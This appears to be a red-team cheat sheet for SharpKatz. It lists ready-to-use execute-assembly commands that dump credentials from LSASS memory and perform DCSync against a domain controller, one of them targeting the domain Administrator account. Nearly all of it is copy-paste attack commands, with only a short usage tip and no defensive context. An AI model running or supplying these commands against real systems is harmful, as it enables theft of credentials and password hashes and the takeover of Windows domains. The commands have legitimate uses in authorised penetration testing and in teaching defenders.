# SharpKatz

For dumping specific user credentials, need to specify domain name before the user or it won't work. Really useful!

### 1) LSASS Dump

    execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command logonpasswords    
    execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command ekeys

### 2) DCSync

    execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --Domain domain.com
    execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --Domain domain.com --DomainController dc01.domain.com

### 3) DCSync - As a user on a machine with no write perms - use this

    execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsync --User DOMAIN\\Administrator --Domain domain.COM --DomainController dc01.domain.com
